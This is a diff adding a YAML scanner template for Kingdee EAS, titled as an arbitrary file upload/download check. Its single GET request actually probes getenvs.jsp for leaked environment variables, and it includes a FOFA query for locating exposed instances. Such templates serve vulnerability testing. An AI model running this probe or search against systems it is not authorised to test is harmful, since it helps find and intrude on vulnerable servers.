@@ -1,0 +1,22 @@
+id: poc-yaml-kingdee-eas-sapputiljsp-anyfile-upload
+info:
+  name: 金蝶EAS appUtil.jsp 任意文件上传下载漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 金蝶 EAS
+  fofa: app="Kingdee-EAS"
+requests:
+- method: GET
+  path: /easportal/tools/getenvs.jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,"programfiles(x86)") &&
+
+    contains(body,"ADMINCLASSPATH") &&
+
+    contains(body,"USE_HTTPSERVER_FOR_DOWNLOAD")
+
+    '
+variables: {}
+transport: http
